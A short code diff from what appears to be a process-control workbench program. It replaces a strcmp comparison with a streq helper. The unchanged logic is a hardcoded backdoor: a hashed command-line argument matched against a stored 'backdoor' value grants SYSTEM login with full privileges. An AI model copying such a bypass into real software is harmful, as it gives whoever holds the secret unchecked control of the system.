@@ -237,7 +237,7 @@ WbQt::WbQt(int argc, char* argv[]) : mainwindow(0)
         "SYSTEM", password, username, pwr_mAccess_AllPwr, 0);
     nav_display = 1;
   } else {
-    if (arg_cnt >= 1 && strcmp(UserList::pwcrypt(argv[1]), backdoor) == 0) {
+    if (arg_cnt >= 1 && streq(UserList::pwcrypt(argv[1]), backdoor)) {
       /* Login as system !! */
       CoLogin::insert_login_info("SYSTEM", "", "", pwr_mAccess_AllPwr, 0);
       nav_display = 1;
